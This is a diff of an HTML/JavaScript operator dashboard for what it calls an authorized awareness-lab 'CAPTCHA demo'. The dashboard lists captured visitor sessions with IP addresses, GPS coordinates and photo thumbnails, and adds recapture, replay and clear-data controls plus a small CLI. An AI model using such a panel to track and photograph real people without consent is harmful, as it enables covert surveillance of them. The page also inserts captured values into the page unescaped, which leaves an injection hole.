@@ -5,11 +5,94 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Operator Dashboard</title>
 <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+<style>
+    /* Tambahan untuk terminal */
+    .terminal {
+        background: #1e1e1e;
+        color: #00ff00;
+        font-family: 'Courier New', monospace;
+        padding: 12px;
+        border-radius: 6px;
+        max-height: 200px;
+        overflow-y: auto;
+        font-size: 13px;
+        margin-top: 16px;
+        width: 100%;
+        max-width: 1100px;
+    }
+    .terminal-input {
+        display: flex;
+        gap: 8px;
+        margin-top: 8px;
+    }
+    .terminal-input input {
+        flex: 1;
+        padding: 8px;
+        background: #2d2d2d;
+        border: 1px solid #555;
+        color: #fff;
+        border-radius: 4px;
+        font-family: 'Courier New', monospace;
+    }
+    .terminal-input button {
+        padding: 8px 16px;
+        background: #007acc;
+        color: #fff;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+    }
+    .terminal-input button:hover {
+        background: #005f9e;
+    }
+    .log-area {
+        max-height: 150px;
+        overflow-y: auto;
+        background: #f5f5f5;
+        padding: 8px;
+        border-radius: 4px;
+        font-size: 12px;
+        margin-top: 12px;
+        border: 1px solid #ddd;
+    }
+    .log-area .log-entry {
+        border-bottom: 1px solid #eee;
+        padding: 2px 0;
+    }
+    .log-area .log-entry .time {
+        color: #888;
+        margin-right: 12px;
+    }
+    .replay-btn {
+        background: #ff9800;
+        color: #fff;
+        border: none;
+        padding: 6px 14px;
+        border-radius: 4px;
+        cursor: pointer;
+        font-weight: bold;
+    }
+    .replay-btn:hover {
+        background: #e68900;
+    }
+</style>
 </head>
 <body class="dashboard-body">
   <div class="lab-banner">AUTHORIZED SECURITY AWARENESS LAB</div>
   <h1 class="dash-title">Operator Dashboard — CAPTCHA Demo</h1>
   <p class="dash-sub">Auto-refreshes every 3 seconds. Data shown here is local-lab only.</p>
+
+  <div style="display: flex; gap: 16px; margin-bottom: 16px; flex-wrap: wrap;">
+    <button onclick="window.open('/recapture', '_blank')" style="padding: 8px 20px; background: #ff9800; color: #fff; border: none; border-radius: 4px; cursor: pointer; font-weight: bold;">
+      🔄 Force Recapture (buka tab baru)
+    </button>
+    <button onclick="if(confirm('Hapus semua data?')){ fetch('/api/clear_all', {method:'POST'}).then(()=>location.reload()); }" style="padding: 8px 20px; background: #d32f2f; color: #fff; border: none; border-radius: 4px; cursor: pointer;">
+      🗑️ Clear All Data
+    </button>
+    <button onclick="refreshTable()" style="padding: 8px 20px; background: #2196F3; color: #fff; border: none; border-radius: 4px; cursor: pointer;">
+      🔄 Refresh
+    </button>
+  </div>
 
   <table class="dash-table">
     <thead>
@@ -22,28 +105,57 @@
         <th>Location</th>
         <th>Lat / Long</th>
         <th>Captcha</th>
+        <th>Recaptures</th>
+        <th>Photo</th>
+        <th>Action</th>
       </tr>
     </thead>
     <tbody id="sessions-body">
-      <tr><td colspan="8">Waiting for sessions...</td></tr>
+      <tr><td colspan="11">Waiting for sessions...</td></tr>
     </tbody>
   </table>
 
+  <!-- Terminal Console -->
+  <div style="width: 100%; max-width: 1100px; margin-top: 20px;">
+    <h3 style="margin-bottom: 8px;">🖥️ Terminal Console (CLI)</h3>
+    <div class="terminal" id="terminal-output">
+      > Welcome to Lab CLI. Type a command below.
+    </div>
+    <div class="terminal-input">
+      <input type="text" id="cli-command" placeholder="e.g. status LAB-1234" />
+      <button onclick="executeCommand()">Run</button>
+    </div>
+    <div style="font-size:12px; color:#888; margin-top:4px;">
+      Commands: sessions, status &lt;id&gt;, capture-result &lt;id&gt;, replay &lt;id&gt;
+    </div>
+  </div>
+
+  <!-- Audit Log -->
+  <div style="width: 100%; max-width: 1100px; margin-top: 20px;">
+    <h3>📋 Audit Log</h3>
+    <div class="log-area" id="log-area">
+      <div class="log-entry">Loading logs...</div>
+    </div>
+  </div>
+
   <script>
-    async function refresh() {
+    async function refreshTable() {
       try {
-        const res = await fetch('/api/data');
+        const res = await fetch('/api/dashboard/sessions');
         if (!res.ok) throw new Error('Network error');
-        const s = await res.json();
+        const sessions = await res.json();
         const body = document.getElementById('sessions-body');
-        if (!s || !s.session_id) {
-          body.innerHTML = '<tr><td colspan="8">No active session.</td></tr>';
+        if (!sessions || sessions.length === 0) {
+          body.innerHTML = '<tr><td colspan="11">No active sessions.</td></tr>';
           return;
         }
-        const loc = s.location || {};
-        const hasLoc = loc.latitude != null && loc.longitude != null;
-        body.innerHTML = `
-          <tr>
+        body.innerHTML = sessions.map(s => {
+          const loc = s.location || {};
+          const hasLoc = loc.latitude != null && loc.longitude != null;
+          const photoThumb = s.photo_path
+            ? `<img src="/data/captures/${s.photo_path}" class="thumb" style="width:50px;height:50px;object-fit:cover;">`
+            : '-';
+          return `<tr>
             <td>${s.session_id}</td>
             <td>${new Date(s.created_at).toLocaleString()}</td>
             <td>${s.ip}</td>
@@ -52,14 +164,119 @@
             <td>${s.location_permission || 'PENDING'}</td>
             <td>${hasLoc ? loc.latitude.toFixed(5) + ', ' + loc.longitude.toFixed(5) : '-'}</td>
             <td>${s.captcha_verified ? '✅' : '❌'}</td>
-          </tr>
-        `;
+            <td>${s.recapture_count || 0}</td>
+            <td>${photoThumb}</td>
+            <td>
+              <button class="replay-btn" onclick="replaySession('${s.session_id}')">Replay</button>
+            </td>
+          </tr>`;
+        }).join('');
       } catch (e) {
-        console.error('Dashboard refresh failed', e);
+        console.error('Refresh failed', e);
       }
     }
-    refresh();
-    setInterval(refresh, 3000);
+
+    async function replaySession(sid) {
+      try {
+        const resp = await fetch('/api/dashboard/replay', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ session_id: sid })
+        });
+        const data = await resp.json();
+        if (data.ok) {
+          alert(`Replay generated for ${sid}`);
+          refreshTable();
+          fetchLogs();
+        } else {
+          alert('Replay failed: ' + (data.error || 'unknown error'));
+        }
+      } catch (e) {
+        alert('Error: ' + e.message);
+      }
+    }
+
+    async function fetchLogs() {
+      try {
+        const res = await fetch('/api/dashboard/logs');
+        const logs = await res.json();
+        const area = document.getElementById('log-area');
+        if (!logs || logs.length === 0) {
+          area.innerHTML = '<div class="log-entry">No logs yet.</div>';
+          return;
+        }
+        area.innerHTML = logs.slice().reverse().map(entry =>
+          `<div class="log-entry"><span class="time">${entry.timestamp}</span> ${entry.message}</div>`
+        ).join('');
+      } catch (e) {
+        console.error('Log fetch failed', e);
+      }
+    }
+
+    // Terminal command execution
+    async function executeCommand() {
+      const input = document.getElementById('cli-command');
+      const cmd = input.value.trim();
+      if (!cmd) return;
+      const output = document.getElementById('terminal-output');
+      output.innerHTML += `\n> ${cmd}`;
+
+      // Parse command
+      const parts = cmd.split(' ');
+      const command = parts[0];
+      const arg = parts[1] || '';
+
+      try {
+        let resp;
+        if (command === 'sessions') {
+          resp = await fetch('/api/dashboard/sessions');
+          const data = await resp.json();
+          output.innerHTML += `\n${JSON.stringify(data, null, 2)}`;
+        } else if (command === 'status' && arg) {
+          resp = await fetch(`/api/cli/status/${arg}`);
+          const data = await resp.json();
+          output.innerHTML += `\n${JSON.stringify(data, null, 2)}`;
+        } else if (command === 'capture-result' && arg) {
+          resp = await fetch(`/api/cli/capture-result/${arg}`);
+          const data = await resp.json();
+          if (data.ok) {
+            output.innerHTML += `\n✅ Image base64 available (${data.image_base64.length} chars). Saved as capture_${arg}.jpg`;
+            // Simpan otomatis? Tidak bisa dari browser.
+          } else {
+            output.innerHTML += `\n❌ ${data.error}`;
+          }
+        } else if (command === 'replay' && arg) {
+          resp = await fetch(`/api/cli/replay/${arg}`);
+          const data = await resp.json();
+          if (data.ok) {
+            output.innerHTML += `\n✅ Replay generated for ${arg}`;
+            refreshTable();
+            fetchLogs();
+          } else {
+            output.innerHTML += `\n❌ Replay failed`;
+          }
+        } else {
+          output.innerHTML += `\n❌ Unknown command or missing argument.`;
+        }
+      } catch (e) {
+        output.innerHTML += `\n❌ Error: ${e.message}`;
+      }
+      input.value = '';
+      output.scrollTop = output.scrollHeight;
+    }
+
+    // Event listener for Enter key
+    document.getElementById('cli-command').addEventListener('keypress', function(e) {
+      if (e.key === 'Enter') executeCommand();
+    });
+
+    // Initial refresh
+    refreshTable();
+    fetchLogs();
+    setInterval(() => {
+      refreshTable();
+      fetchLogs();
+    }, 3000);
   </script>
 </body>
 </html>
